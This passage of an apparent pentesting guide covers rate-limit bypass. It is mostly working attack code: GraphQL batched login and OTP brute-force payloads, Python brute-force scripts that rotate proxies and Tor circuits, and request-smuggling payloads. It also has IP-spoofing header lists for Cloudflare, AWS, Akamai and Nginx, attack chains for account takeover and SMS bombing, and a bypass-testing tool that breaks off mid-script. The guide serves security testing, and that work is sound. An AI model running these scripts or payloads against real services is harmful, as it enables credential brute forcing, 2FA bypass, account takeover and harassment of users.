    attempt1: login(email:\"victim@example.com\", password:\"pass1\") { token }
    attempt2: login(email:\"victim@example.com\", password:\"pass2\") { token }
    attempt3: login(email:\"victim@example.com\", password:\"pass3\") { token }
    attempt4: login(email:\"victim@example.com\", password:\"pass4\") { token }
    attempt5: login(email:\"victim@example.com\", password:\"pass5\") { token }
  }"
}

# OTP brute force via GraphQL batch:
[
  {"query":"mutation{verifyOTP(code:\"000001\"){success}}"},
  {"query":"mutation{verifyOTP(code:\"000002\"){success}}"},
  {"query":"mutation{verifyOTP(code:\"000003\"){success}}"},
  ...
  {"query":"mutation{verifyOTP(code:\"001000\"){success}}"}
]
# → 1000 OTP attempts in 1 HTTP request!
```

```python [graphql_batch_brute.py]
#!/usr/bin/env python3
"""
GraphQL Batch Rate Limit Bypass
Send hundreds of login attempts per single request
"""
import requests
import json

TARGET = "https://target.com/graphql"
BATCH_SIZE = 100  # Queries per request

def generate_alias_query(email, passwords):
    """Generate aliased query with multiple login attempts"""
    mutations = []
    for i, pwd in enumerate(passwords):
        pwd_escaped = pwd.replace('"', '\\"')
        mutations.append(
            f'a{i}: login(email: "{email}", password: "{pwd_escaped}") {{ token success }}'
        )
    
    query = "mutation {\n  " + "\n  ".join(mutations) + "\n}"
    return {"query": query}

def generate_batch_query(email, passwords):
    """Generate batch array of queries"""
    batch = []
    for pwd in passwords:
        pwd_escaped = pwd.replace('"', '\\"')
        batch.append({
            "query": f'mutation {{ login(email: "{email}", password: "{pwd_escaped}") {{ token success }} }}'
        })
    return batch

def brute_force(email, password_file):
    with open(password_file) as f:
        all_passwords = [line.strip() for line in f]
    
    print(f"[*] Total passwords: {len(all_passwords)}")
    print(f"[*] Batch size: {BATCH_SIZE}")
    print(f"[*] Total requests needed: {len(all_passwords)//BATCH_SIZE + 1}")
    
    for i in range(0, len(all_passwords), BATCH_SIZE):
        batch = all_passwords[i:i+BATCH_SIZE]
        
        # Try alias method first
        payload = generate_alias_query(email, batch)
        resp = requests.post(TARGET, json=payload, timeout=30)
        
        if resp.status_code == 200:
            data = resp.json().get("data", {})
            for key, value in data.items():
                if value and value.get("success"):
                    idx = int(key[1:])  # Extract index from alias
                    print(f"\n[+] VALID PASSWORD: {batch[idx]}")
                    return batch[idx]
        
        # Fallback to batch array
        elif resp.status_code == 400:
            payload = generate_batch_query(email, batch)
            resp = requests.post(TARGET, json=payload, timeout=30)
            
            if resp.status_code == 200:
                results = resp.json()
                for j, result in enumerate(results):
                    if result.get("data", {}).get("login", {}).get("success"):
                        print(f"\n[+] VALID PASSWORD: {batch[j]}")
                        return batch[j]
        
        print(f"[*] Batch {i//BATCH_SIZE + 1}: Tested {min(i+BATCH_SIZE, len(all_passwords))}/{len(all_passwords)}")

brute_force("victim@example.com", "passwords.txt")
```

---

## IP Rotation & Distributed Attacks

When header manipulation fails, use **actual IP rotation** to bypass network-level rate limiting.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Proxy Rotation"}
  ```python [proxy_rotate.py]
  #!/usr/bin/env python3
  """
  Rate Limit Bypass via Proxy Rotation
  Uses rotating proxy pool for unique source IP per request
  """
  import requests
  import random

  TARGET = "https://target.com/api/login"

  # Free proxy lists (for testing):
  PROXIES = [
      "http://proxy1:8080",
      "http://proxy2:8080",
      "socks5://proxy3:1080",
      "http://user:pass@proxy4:8080",
      # Add more proxies...
  ]

  # OR use rotating proxy services:
  # BrightData: http://USER:PASS@brd.superproxy.io:22225
  # Smartproxy: http://USER:PASS@gate.smartproxy.com:7000
  # ProxyMesh: http://USER:PASS@us-dc.proxymesh.com:31280

  ROTATING_PROXY = "http://USER:PASS@rotating-proxy-service.com:PORT"

  def try_with_rotation(email, passwords):
      for i, pwd in enumerate(passwords):
          # Use rotating proxy (new IP each request)
          proxy = {"http": ROTATING_PROXY, "https": ROTATING_PROXY}
          
          # OR pick random from list:
          # p = random.choice(PROXIES)
          # proxy = {"http": p, "https": p}
          
          data = {"email": email, "password": pwd}
          
          try:
              resp = requests.post(
                  TARGET, json=data, proxies=proxy, 
                  timeout=15, verify=False
              )
              print(f"[{i}] {pwd} → {resp.status_code}")
              
              if resp.status_code == 200 and "success" in resp.text.lower():
                  print(f"[+] FOUND: {pwd}")
                  return pwd
          except Exception as e:
              print(f"[{i}] Proxy error: {e}")
      
      return None
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Tor Circuit Rotation"}
  ```bash [Terminal]
  # Using Tor for IP rotation
  # Install Tor
  sudo apt install tor -y
  
  # Start Tor service
  sudo service tor start
  
  # Configure Tor for circuit rotation
  # Edit /etc/tor/torrc:
  echo "MaxCircuitDirtiness 10" | sudo tee -a /etc/tor/torrc
  echo "NewCircuitPeriod 10" | sudo tee -a /etc/tor/torrc
  sudo service tor restart
  
  # Use with curl:
  curl --socks5 127.0.0.1:9050 https://target.com/api/login \
    -X POST -H "Content-Type: application/json" \
    -d '{"email":"victim@example.com","password":"test"}'
  
  # Force new circuit (new IP):
  # Send NEWNYM signal to Tor control port
  echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT' | nc 127.0.0.1 9051
  
  # Using torsocks:
  torsocks curl https://target.com/api/login ...
  
  # Using proxychains:
  proxychains4 python3 brute_force.py
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Tor Python Script"}
  ```python [tor_rotate.py]
  #!/usr/bin/env python3
  """
  Rate Limit Bypass via Tor Circuit Rotation
  New IP for each batch of requests
  """
  import requests
  import time
  from stem import Signal
  from stem.control import Controller

  TOR_PROXY = {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}
  TOR_CONTROL_PORT = 9051
  TOR_PASSWORD = ""  # Set in torrc: HashedControlPassword

  def renew_tor_circuit():
      """Get a new Tor circuit (new IP)"""
      try:
          with Controller.from_port(port=TOR_CONTROL_PORT) as controller:
              controller.authenticate(password=TOR_PASSWORD)
              controller.signal(Signal.NEWNYM)
              time.sleep(3)  # Wait for new circuit
      except Exception as e:
          print(f"[!] Tor circuit renewal failed: {e}")

  def get_current_ip():
      """Check current exit IP"""
      try:
          resp = requests.get("https://api.ipify.org", proxies=TOR_PROXY, timeout=10)
          return resp.text
      except:
          return "unknown"

  def brute_force(email, passwords, batch_size=10):
      for i, pwd in enumerate(passwords):
          # Rotate circuit every batch
          if i > 0 and i % batch_size == 0:
              renew_tor_circuit()
              new_ip = get_current_ip()
              print(f"[*] New Tor IP: {new_ip}")
          
          data = {"email": email, "password": pwd}
          
          try:
              resp = requests.post(
                  "https://target.com/api/login",
                  json=data,
                  proxies=TOR_PROXY,
                  timeout=15
              )
              
              if resp.status_code == 200 and "success" in resp.text.lower():
                  print(f"[+] VALID: {pwd}")
                  return pwd
              
              print(f"[{i}] {pwd} → {resp.status_code}")
          except:
              renew_tor_circuit()

  # Install: pip3 install requests[socks] stem
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Cloud Functions"}
  ```txt [Attack Flow]
  # Deploy serverless functions across multiple regions
  # Each function has a UNIQUE IP address

  # AWS Lambda (different regions = different IPs):
  - Deploy login brute force function to:
    us-east-1, us-west-2, eu-west-1, ap-southeast-1
  - Each invocation from each region = different IP
  - Invoke hundreds of Lambda functions simultaneously

  # Google Cloud Functions:
  - Same concept, deploy across regions
  - Each cold start may get new IP

  # Azure Functions:
  - Consumption plan = dynamic IP assignment

  # Architecture:
  Attacker → Orchestrator
              ├── Lambda us-east-1 → try passwords 1-100
              ├── Lambda us-west-2 → try passwords 101-200
              ├── Lambda eu-west-1 → try passwords 201-300
              └── Lambda ap-east-1 → try passwords 301-400

  # Each Lambda gets unique IP
  # Target sees requests from many different IPs
  # Rate limit per IP is never exceeded
  ```
  :::
::

---

## Request Smuggling / Desync

Advanced technique exploiting differences between **front-end** (rate limiter/WAF/proxy) and **back-end** (application server) request parsing.

::warning
Request smuggling is a **complex and potentially destructive** attack. Test with extreme caution. It can affect other users on shared infrastructure.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="CL.TE Smuggling"}
  ```txt [Payloads]
  # Content-Length vs Transfer-Encoding disagreement
  # Front-end uses Content-Length, back-end uses Transfer-Encoding

  # The front-end sees 1 request (passes rate limit)
  # The back-end sees 2 requests (smuggled request bypasses rate limit)

  POST /api/login HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 50
  Transfer-Encoding: chunked

  0

  POST /api/login HTTP/1.1
  Host: target.com
  Content-Type: application/json
  Content-Length: 60

  {"email":"victim@example.com","password":"smuggled_attempt"}
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="TE.CL Smuggling"}
  ```txt [Payloads]
  # Front-end uses Transfer-Encoding, back-end uses Content-Length

  POST /api/login HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 4
  Transfer-Encoding: chunked

  2c
  POST /api/login HTTP/1.1
  Content-Length: 60

  {"email":"victim@example.com","password":"smuggled"}
  0

  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="HTTP/2 Desync"}
  ```txt [Concept]
  # HTTP/2 downgrade smuggling
  # Front-end speaks HTTP/2, back-end speaks HTTP/1.1

  # HTTP/2 request with smuggled HTTP/1.1:
  :method: POST
  :path: /api/login
  :authority: target.com
  content-type: application/json
  content-length: 0
  transfer-encoding: chunked

  0

  POST /api/login HTTP/1.1
  Host: target.com
  Content-Type: application/json
  Content-Length: 60

  {"email":"victim@example.com","password":"smuggled"}

  # The H2 front-end processes as 1 request
  # The H1 back-end processes as 2 requests
  # Rate limiter on front-end counts 1
  # Application on back-end handles 2 login attempts
  ```
  :::
::

---

## WAF / CDN Specific Bypass

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Cloudflare Bypass"}
  ```txt [Payloads]
  # Cloudflare rate limiting bypass techniques:

  # 1. Find origin IP (bypass Cloudflare entirely):
  #    - Check DNS history: SecurityTrails, ViewDNS
  #    - Check email headers (SPF/DKIM reveal origin)
  #    - Check SSL certificate transparency
  #    - Scan common cloud IP ranges
  #    - Check Shodan: ssl.cert.subject.cn:target.com

  # 2. Cloudflare-specific headers:
  CF-Connecting-IP: RANDOM_IP
  CF-IPCountry: US
  CF-RAY: random_ray_id
  CF-Visitor: {"scheme":"https"}

  # 3. Access via Cloudflare Workers:
  #    Workers get internal Cloudflare IPs
  #    May bypass rate limits intended for external traffic

  # 4. Websocket upgrade (different rate limit):
  Connection: Upgrade
  Upgrade: websocket

  # 5. Cache bypass:
  Cache-Control: no-cache
  Pragma: no-cache
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="AWS WAF / ALB"}
  ```txt [Payloads]
  # AWS WAF / Application Load Balancer bypass:

  # 1. X-Forwarded-For trusted by ALB:
  X-Forwarded-For: RANDOM_IP

  # 2. Multiple X-Forwarded-For headers:
  X-Forwarded-For: RANDOM_IP_1
  X-Forwarded-For: RANDOM_IP_2

  # 3. X-Forwarded-For with multiple IPs:
  X-Forwarded-For: RANDOM_IP, REAL_IP

  # 4. Direct to origin (bypass WAF):
  #    Find EC2/ELB direct IP via:
  #    - DNS enumeration
  #    - Internal endpoints leaking IP
  #    - Error pages showing server IP

  # 5. Different regions:
  #    Rate limit may be per-region
  #    Try from different AWS regions/edge locations
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Akamai Bypass"}
  ```txt [Payloads]
  # Akamai rate limiting bypass:

  # 1. Akamai-specific headers:
  True-Client-IP: RANDOM_IP
  Akamai-Origin-Hop: 1
  X-Akamai-Config-Log-Detail: true

  # 2. Pragma headers:
  Pragma: akamai-x-get-client-ip
  Pragma: akamai-x-cache-on
  Pragma: akamai-x-cache-remote-on
  Pragma: akamai-x-get-true-cache-key

  # 3. Edge bypass:
  #    Find staging/origin directly
  #    Check for *.edgesuite.net CNAME
  #    Direct connection to origin server

  # 4. HTTPS vs HTTP:
  #    Rate limits may differ between protocols
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Nginx / Rate Limit Module"}
  ```txt [Payloads]
  # Nginx limit_req module bypass:

  # Nginx typically uses $binary_remote_addr for rate limiting
  # If behind proxy, it may use $http_x_forwarded_for

  # 1. X-Forwarded-For (if trusted):
  X-Forwarded-For: RANDOM_IP

  # 2. X-Real-IP (commonly configured):
  X-Real-IP: RANDOM_IP

  # 3. Path normalization difference:
  #    Nginx normalizes: /api/login → /api/login
  #    But rate_limit zone may be path-specific
  /api/login   → rate limited
  /api/./login → might bypass (different path string)
  /API/LOGIN   → might bypass (case sensitivity)

  # 4. Request method:
  #    limit_req may only apply to specific methods
  POST /api/login → rate limited
  PUT /api/login  → might bypass

  # 5. HTTP/2 vs HTTP/1.1:
  #    Rate limit may only apply to HTTP/1.1
  #    Force HTTP/2: curl --http2 ...

  # 6. Connection: keep-alive
  #    Reuse connection for multiple requests
  #    Some implementations count per-connection
  ```
  :::
::

---

## Timing & Delay Manipulation

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Slow Request Timing"}
  ```txt [Concept]
  # If rate limit uses fixed time windows:
  # e.g., "10 requests per minute"

  # Strategy 1: Request at window boundary
  # Send 10 requests at 0:59.990 (end of window 1)
  # Send 10 more at 1:00.001 (start of window 2)
  # → 20 requests in ~1 second that spans two windows

  # Strategy 2: Detect exact reset time from headers
  X-RateLimit-Reset: 1625000060  # Unix timestamp
  # Calculate exact reset time
  # Queue burst of requests for exactly that moment

  # Strategy 3: Retry-After abuse
  Retry-After: 60
  # Wait exactly 60 seconds, then burst immediately
  # Send max requests before next window triggers
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Window Boundary Attack"}
  ```python [window_boundary.py]
  #!/usr/bin/env python3
  """
  Rate Limit Bypass - Window Boundary Attack
  Send bursts at the exact moment the rate limit window resets
  """
  import requests
  import time

  TARGET = "https://target.com/api/login"
  REQUESTS_PER_WINDOW = 10
  WINDOW_SECONDS = 60

  def detect_window(url):
      """Detect rate limit window from response headers"""
      resp = requests.post(url, json={"email":"test@test.com","password":"x"})
      
      reset = resp.headers.get("X-RateLimit-Reset")
      remaining = resp.headers.get("X-RateLimit-Remaining")
      retry_after = resp.headers.get("Retry-After")
      
      print(f"Reset: {reset}")
      print(f"Remaining: {remaining}")
      print(f"Retry-After: {retry_after}")
      
      return int(retry_after or WINDOW_SECONDS)

  def boundary_attack(email, passwords):
      """Send requests at window boundaries for 2x throughput"""
      idx = 0
      
      while idx < len(passwords):
          # Send burst at end of current window
          batch = passwords[idx:idx + REQUESTS_PER_WINDOW]
          
          for pwd in batch:
              data = {"email": email, "password": pwd}
              resp = requests.post(TARGET, json=data, timeout=10)
              
              if resp.status_code == 200 and "success" in resp.text.lower():
                  print(f"[+] FOUND: {pwd}")
                  return pwd
              
              if resp.status_code == 429:
                  retry = int(resp.headers.get("Retry-After", WINDOW_SECONDS))
                  print(f"[*] Rate limited. Waiting {retry}s for window reset...")
                  time.sleep(retry)
                  break
          
          idx += len(batch)
          print(f"[*] Completed {idx}/{len(passwords)} attempts")

  with open("passwords.txt") as f:
      passwords = [l.strip() for l in f]
  boundary_attack("victim@example.com", passwords)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Slow POST / Slowloris"}
  ```txt [Concept]
  # Send request body very slowly
  # Connection stays open for extended period
  # Some rate limiters count completed requests only
  # The "slow" request may not be counted

  # Technique:
  # 1. Open connection
  # 2. Send headers normally
  # 3. Send body ONE BYTE at a time with delays
  # 4. Request takes 60+ seconds to complete
  # 5. Rate limiter may not count it

  # This can also exhaust connection pools
  # and cause denial of service on rate limiter itself
  ```
  :::
::

---

## Privilege Escalation Chains

Rate limit bypass alone is usually **informational or low severity**. Its power comes from **chaining with high-impact attacks**.

::note
Always demonstrate the **full chain** in your report. A rate limit bypass that enables account takeover is **critical**. A rate limit bypass on a non-sensitive endpoint is **low/informational**.
::

::card-group
  ::card
  ---
  title: Login Brute Force → Account Takeover
  icon: i-lucide-lock-open
  ---
  Bypass rate limit on `/login` → Brute force credentials → Full account access. Severity escalates to **Critical** with valid password lists from breaches.
  ::

  ::card
  ---
  title: OTP/2FA Brute Force → Auth Bypass
  icon: i-lucide-shield-off
  ---
  Bypass rate limit on `/verify-otp` → Brute force 4-6 digit OTP → Complete 2FA bypass → Account takeover.
  ::

  ::card
  ---
  title: Password Reset Abuse → Account Takeover
  icon: i-lucide-key-round
  ---
  Bypass rate limit on `/forgot-password` → Send unlimited reset emails → Token brute force or email flood → Account takeover.
  ::

  ::card
  ---
  title: User Enumeration → Targeted Attacks
  icon: i-lucide-users
  ---
  Bypass rate limit on registration/login → Enumerate valid usernames/emails → Build target list → Credential stuffing.
  ::

  ::card
  ---
  title: SMS/Email Flood → Financial Loss
  icon: i-lucide-mail-warning
  ---
  Bypass rate limit on OTP send → Trigger unlimited SMS messages → Financial cost to target (SMS APIs charge per message). Severity: **Medium-High**.
  ::

  ::card
  ---
  title: API Data Scraping → Data Breach
  icon: i-lucide-database
  ---
  Bypass rate limit on API endpoints → Scrape entire database (users, products, data) → Privacy violation, competitive intelligence theft.
  ::
::

### Chain: Rate Limit Bypass → OTP Brute Force

```txt [Attack Flow]
STEP 1: Identify rate limit on /api/verify-otp
        → 5 attempts per minute per IP

STEP 2: Bypass rate limit via X-Forwarded-For rotation
        → Unlimited OTP attempts

STEP 3: Brute force 6-digit OTP
        → 000000 to 999999 (1M combinations)
        → At 1000 req/sec = ~17 minutes

STEP 4: Valid OTP found
        → Complete 2FA verification
        → Full account access

IMPACT: Critical - Full Account Takeover
        Any account with known password can be compromised
        2FA protection completely neutralized
```

### Chain: Rate Limit Bypass → User Enumeration

```txt [Attack Flow]
STEP 1: Identify different responses for valid/invalid emails
        → Valid: "Invalid password"
        → Invalid: "Account not found"

STEP 2: Rate limit on /api/login or /api/register
        → 10 attempts per minute

STEP 3: Bypass rate limit via session rotation
        → Unlimited enumeration attempts

STEP 4: Enumerate all valid emails/usernames
        → Test against breach databases
        → Credential stuffing with known passwords

STEP 5: Identify valid credentials
        → Account takeover

IMPACT: High - Mass Account Enumeration + Credential Stuffing
```

### Chain: Rate Limit Bypass → SMS Bombing

```txt [Attack Flow]
STEP 1: Find OTP send endpoint: POST /api/send-otp

STEP 2: Rate limit: 3 OTP sends per phone number per hour

STEP 3: Bypass via parameter manipulation:
        → Change phone format: +1234567890, 1234567890, 001234567890
        → Or bypass via header rotation

STEP 4: Send unlimited OTP SMS to victim's phone
        → Financial cost to target (SMS API charges)
        → Harassment of victim
        → Potential denial of service on SMS gateway

IMPACT: Medium - Financial Loss + Harassment
        Each SMS costs $0.01-0.05
        1M SMS = $10,000-$50,000 cost to target
```

---

## Testing Checklist

::collapsible

```txt [Rate Limit Bypass Testing Checklist]
═══════════════════════════════════════════════════════
  RATE LIMIT BYPASS TESTING CHECKLIST
═══════════════════════════════════════════════════════

[ ] RECONNAISSANCE
    [ ] Identify rate-limited endpoints
    [ ] Detect rate limit threshold (requests/window)
    [ ] Note rate limit response (429? 403? Captcha?)
    [ ] Check rate limit response headers
    [ ] Determine tracking method (IP? Session? User? API key?)
    [ ] Identify rate limiter type (App? WAF? CDN? Proxy?)

[ ] HEADER MANIPULATION
    [ ] X-Forwarded-For: RANDOM_IP
    [ ] X-Real-IP: RANDOM_IP
    [ ] X-Originating-IP: RANDOM_IP
    [ ] X-Client-IP: RANDOM_IP
    [ ] True-Client-IP: RANDOM_IP
    [ ] CF-Connecting-IP: RANDOM_IP
    [ ] Fastly-Client-IP: RANDOM_IP
    [ ] X-Azure-ClientIP: RANDOM_IP
    [ ] X-Cluster-Client-IP: RANDOM_IP
    [ ] Forwarded: for=RANDOM_IP
    [ ] X-Remote-IP / X-Remote-Addr
    [ ] X-ProxyUser-IP
    [ ] X-Original-Forwarded-For
    [ ] Double header (same header twice)
    [ ] All headers simultaneously
    [ ] IPv6 addresses
    [ ] Localhost/loopback variations (127.0.0.x)

[ ] ENDPOINT VARIATION
    [ ] Case change: /API/LOGIN
    [ ] Trailing slash: /api/login/
    [ ] Double slash: //api//login
    [ ] Dot segments: /api/./login
    [ ] URL encoding: /api/%6cogin
    [ ] Double URL encoding: /api/%256cogin
    [ ] Null byte: /api/login%00
    [ ] Semicolon: /api/login;.js
    [ ] Path parameters: /api/login;bypass=1
    [ ] Query string: /api/login?_=timestamp
    [ ] Fragment: /api/login#fragment

[ ] HTTP METHOD
    [ ] GET instead of POST
    [ ] PUT instead of POST
    [ ] PATCH instead of POST
    [ ] X-HTTP-Method-Override header
    [ ] ?_method=PUT parameter

[ ] CONTENT-TYPE
    [ ] application/json
    [ ] application/x-www-form-urlencoded
    [ ] multipart/form-data
    [ ] application/xml
    [ ] text/plain
    [ ] No Content-Type
    [ ] Charset variations

[ ] API VERSION
    [ ] /api/v1/ (older version)
    [ ] /api/v3/ (newer/beta)
    [ ] /mobile/api/ (mobile)
    [ ] /internal/api/ (internal)
    [ ] /graphql (different endpoint)

[ ] PARAMETER MANIPULATION
    [ ] Duplicate parameters (HPP)
    [ ] URL param + body param
    [ ] Null bytes in values
    [ ] Whitespace padding
    [ ] Unicode zero-width characters
    [ ] Extra random parameters (cache buster)
    [ ] Array injection: {"param":["val"]}

[ ] EMAIL/USERNAME VARIATION
    [ ] Case change: Victim@example.com
    [ ] Plus addressing: victim+1@example.com
    [ ] Dot trick: v.ictim@example.com
    [ ] URL encoding: victim%40example.com
    [ ] Whitespace: %20victim@example.com

[ ] SESSION ROTATION
    [ ] Clear cookies → new session
    [ ] Delete rate limit cookies
    [ ] Rotate session cookie value
    [ ] New CSRF token per request
    [ ] Generate new API key

[ ] RACE CONDITIONS
    [ ] Simultaneous requests (asyncio)
    [ ] Turbo Intruder gate mechanism
    [ ] Single packet attack (HTTP/2)
    [ ] curl background processes (&)
    [ ] GNU parallel

[ ] GRAPHQL BATCH
    [ ] Array of queries in single request
    [ ] Aliased mutations
    [ ] Batch OTP verification

[ ] DISTRIBUTED / IP ROTATION
    [ ] Proxy rotation
    [ ] Tor circuit rotation
    [ ] Cloud functions (multi-region)
    [ ] VPN server switching

[ ] WAF / CDN BYPASS
    [ ] Find origin IP (bypass CDN)
    [ ] CDN-specific headers
    [ ] HTTP/2 vs HTTP/1.1
    [ ] Websocket upgrade
    [ ] Direct origin connection

[ ] TIMING
    [ ] Window boundary attack
    [ ] Detect exact reset timestamp
    [ ] Burst at window edge
    [ ] Slow request (partial body)

[ ] REQUEST SMUGGLING
    [ ] CL.TE desync
    [ ] TE.CL desync
    [ ] HTTP/2 downgrade smuggling

[ ] CHAIN WITH IMPACT
    [ ] → Login brute force (account takeover)
    [ ] → OTP brute force (2FA bypass)
    [ ] → Password reset flood
    [ ] → User enumeration
    [ ] → SMS/email bombing (financial)
    [ ] → API data scraping

═══════════════════════════════════════════════════════
```

::

---

## Automation Suite

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Complete Bypass Tester"}
  ::code-collapse
  ```python [rate_limit_bypass.py]
  #!/usr/bin/env python3
  """
  ═══════════════════════════════════════════════
  Rate Limit Bypass - Comprehensive Testing Tool
  Tests all known bypass techniques automatically
  ═══════════════════════════════════════════════
  Usage: python3 rate_limit_bypass.py -u URL -X POST -d DATA
  """
  import requests
  import random
  import string
  import time
  import json
  import sys
  import argparse
  import urllib.parse
  from concurrent.futures import ThreadPoolExecutor, as_completed

  class RateLimitBypass:
      
      IP_HEADERS = [
          "X-Forwarded-For",
          "X-Real-IP",
          "X-Originating-IP",
          "X-Client-IP",
          "X-Remote-IP",
          "X-Remote-Addr",
          "True-Client-IP",
          "CF-Connecting-IP",
          "Fastly-Client-IP",
          "X-Azure-ClientIP",
          "X-Cluster-Client-IP",
          "Forwarded-For",
          "X-ProxyUser-IP",
          "X-Original-Forwarded-For",
          "X-Envoy-External-Address",
      ]
      
      def __init__(self, url, method="POST", data=None, headers=None, 
                   threshold=20, threads=10):
          self.url = url
          self.method = method.upper()
          self.data = data
          self.base_headers = headers or {"Content-Type": "application/json"}
          self.threshold = threshold
          self.threads = threads
          self.results = {}
      
      @staticmethod
      def random_ip():
          return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
      
      def _send(self, extra_headers=None, url_override=None, method_override=None):
          headers = {**self.base_headers}
          if extra_headers:
              headers.update(extra_headers)
          
          url = url_override or self.url
          method = method_override or self.method
          
          try:
              if method == "GET":
                  resp = requests.get(url, headers=headers, timeout=10)
              else:
                  resp = requests.request(
                      method, url, data=self.data, headers=headers, timeout=10
                  )
              return resp.status_code
          except:
              return 0
      
      def test_baseline(self):
          """Detect rate limit threshold without bypass"""
          print("\n[1] BASELINE: Detecting rate limit without bypass...")
          
          for i in range(self.threshold * 2):
              status = self._send()
              if status == 429 or status == 403:
                  print(f"    Rate limited at request {i+1} (HTTP {status})")
                  self.results["baseline"] = f"Limited at {i+1} requests"
                  return i+1
              if i % 5 == 0:
                  print(f"    Request {i+1}: HTTP {status}")
          
          print(f"    No rate limit detected in {self.threshold*2} requests")
          self.results["baseline"] = "No limit detected"
          return -1
      
      def test_single_header(self, header_name):
          """Test single IP header bypass"""
          passed = 0
          for i in range(self.threshold):
              ip = self.random_ip()
              status = self._send(extra_headers={header_name: ip})
              if status != 429 and status != 403 and status != 0:
                  passed += 1
          
          bypassed = passed >= self.threshold - 1
          return header_name, bypassed, passed
      
      def test_all_headers(self):
          """Test all IP spoofing headers"""
          print("\n[2] HEADER BYPASS: Testing IP spoofing headers...")
          
          working = []
          with ThreadPoolExecutor(max_workers=5) as executor:
              futures = {
                  executor.submit(self.test_single_header, h): h 
                  for h in self.IP_HEADERS
              }
              for future in as_completed(futures):
                  name, bypassed, passed = future.result()
                  status = "✓ BYPASS" if bypassed else "✗ Blocked"
                  print(f"    {status}: {name} ({passed}/{self.threshold})")
                  if bypassed:
                      working.append(name)
          
          self.results["headers"] = working
          return working
      
      def test_path_variations(self):
          """Test URL path manipulation"""
          print("\n[3] PATH BYPASS: Testing URL variations...")
          
          parsed = urllib.parse.urlparse(self.url)
          path = parsed.path
          base = f"{parsed.scheme}://{parsed.netloc}"
          
          variations = [
              path.upper(),
              path + "/",
              path + "//",
              "/" + path.lstrip("/"),
              path + "%20",
              path + "%00",
              path + "?",
              path + "?_=" + str(int(time.time())),
              path + ";",
              path + ";.css",
              path + "/.",
              path + "/..",
              path.replace("/", "//"),
              "/." + path,
              "/../" + path.lstrip("/"),
          ]
          
          working = []
          for var in variations:
              url = base + var
              passed = 0
              for i in range(self.threshold):
                  status = self._send(url_override=url)
                  if status != 429 and status != 403 and status != 0:
                      passed += 1
              
              bypassed = passed >= self.threshold - 1
              result = "✓ BYPASS" if bypassed else "✗ Blocked"
              if bypassed:
                  working.append(var)
                  print(f"    {result}: {var} ({passed}/{self.threshold})")
          
          if not working:
              print("    No path variations bypassed rate limit")
          
          self.results["paths"] = working
          return working
      
      def test_method_change(self):
          """Test HTTP method bypass"""
          print("\n[4] METHOD BYPASS: Testing HTTP method changes...")
          
          methods = ["GET", "PUT", "PATCH", "DELETE", "OPTIONS"]
          working = []
          
          for method in methods:
              passed = 0
              for i in range(self.threshold):
                  status = self._send(method_override=method)
                  if status != 429 and status != 403 and status != 0 and status != 405:
                      passed += 1
              
              bypassed = passed >= self.threshold - 1
              result = "✓ BYPASS" if bypassed else "✗ Blocked"
              if bypassed:
                  working.append(method)
              print(f"    {result}: {method} ({passed}/{self.threshold})")
          
          # Test method override headers
          override_headers = [
              {"X-HTTP-Method-Override": "PUT"},
              {"X-HTTP-Method": "PATCH"},
              {"X-Method-Override": "GET"},
          ]
          
          for oh in override_headers:
              passed = 0
              for i in range(self.threshold):
                  status = self._send(extra_headers=oh)
                  if status != 429 and status != 403 and status != 0:
                      passed += 1
              
              header_name = list(oh.keys())[0]
              bypassed = passed >= self.threshold - 1
              result = "✓ BYPASS" if bypassed else "✗ Blocked"
              if bypassed:
                  working.append(f"{header_name}: {oh[header_name]}")
              print(f"    {result}: {header_name} ({passed}/{self.threshold})")
          
          self.results["methods"] = working
          return working
      
      def test_race_condition(self):
          """Test simultaneous requests"""
          print("\n[5] RACE CONDITION: Testing simultaneous requests...")
          
          passed = 0
          total = self.threshold * 2
          
          with ThreadPoolExecutor(max_workers=total) as executor:
              futures = [executor.submit(self._send) for _ in range(total)]
              for future in as_completed(futures):
                  status = future.result()
                  if status != 429 and status != 403 and status != 0:
                      passed += 1
          
          bypassed = passed > self.threshold
          result = "✓ BYPASS" if bypassed else "✗ Blocked"
          print(f"    {result}: {passed}/{total} requests passed simultaneously")
          self.results["race_condition"] = bypassed
          return bypassed
      
      def run_all_tests(self):
          """Run complete bypass test suite"""
          print("=" * 55)
          print("  RATE LIMIT BYPASS - COMPREHENSIVE TESTER")
          print("=" * 55)
          print(f"  Target: {self.url}")
          print(f"  Method: {self.method}")
          print(f"  Threshold: {self.threshold} requests")
          print("=" * 55)
          
          self.test_baseline()
          working_headers = self.test_all_headers()
          self.test_path_variations()
          self.test_method_change()
          self.test_race_condition()
          
          # Summary
          print("\n" + "=" * 55)
          print("  RESULTS SUMMARY")
          print("=" * 55)
          print(f"  Baseline: {self.results.get('baseline', 'N/A')}")
          print(f"  Working Headers: {len(self.results.get('headers', []))}")
          for h in self.results.get("headers", []):
              print(f"    ✓ {h}")
          print(f"  Working Paths: {len(self.results.get('paths', []))}")
          for p in self.results.get("paths", []):
              print(f"    ✓ {p}")
          print(f"  Working Methods: {len(self.results.get('methods', []))}")
          for m in self.results.get("methods", []):
              print(f"    ✓ {m}")
          print(f"  Race Condition: {'✓ Vulnerable' if self.results.get('race_condition') else '✗ Protected'}")
          print("=" * 55)

  def main():
      parser = argparse.ArgumentParser(description="Rate Limit Bypass Tester")
      parser.add_argument("-u", "--url", required=True, help="Target URL")
